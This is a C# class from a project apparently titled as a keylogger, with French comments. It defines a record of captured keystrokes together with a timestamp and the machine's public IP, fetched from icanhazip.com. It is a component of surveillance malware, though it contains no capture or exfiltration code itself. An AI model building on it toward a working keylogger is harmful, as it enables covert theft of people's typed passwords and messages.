﻿using System;
using System.Net;

namespace ProjetKeyLogger
{
    [Serializable]
    public class Enregistrement
    {
        //Contenu de l'enregistrement
        private String contenu = "";
        //Date de l'enregistrement
        private DateTime date;
        //Adresse de l'enregistrement
        private String adresse_ip_publique; 

        //proprieté en lecture / ecriture
        public String Contenu
        {
            get
            {
                return contenu;
            }
            set
            {
                contenu = value;
            }
        }

        //proprieté en lecture / ecriture
        public DateTime Date
        {
            get
            {
                return date;
            }
            set
            {
                date = value;
            }
        }

        //proprieté en lecture / ecriture
        public String Adresse_Ip_Publique
        {
            get
            {
                return adresse_ip_publique;
            }
            set
            {
                adresse_ip_publique = value;
            }
        }

        //Renvoi la date et l'heure a un moment donné
        public void dateTimeNow()
        {
            //Date actuelle
            date =  DateTime.Now;
        }

        //Renvoi l'adresse IP publique de la machine a un moment donné
        public void adresseIpPublique()
        {
            //Retourne l'adresse IP publique
            adresse_ip_publique =  new WebClient().DownloadString("http://icanhazip.com");
        }

        //Fonction qui concatene la derniere touche tapé au clavier, au contenu de l'enregistrement
        public void ajouterContenu(string caractere)
        {
            //Ajout du caractere au contenu du text
            contenu += caractere;
        }

        //Fonction qui supprime le dernier caractère de la chaine
        public void effacerContenu()
        {
            //Si la chaine n'est pas nulle et possède une longueur >0
            if(contenu.Length > 0 || contenu == null)
            {
                //On conserve toute la chaine sauf le dernier caractère tapé
                contenu = contenu.Substring(0, contenu.Length - 1);
            }
        }
    }
}
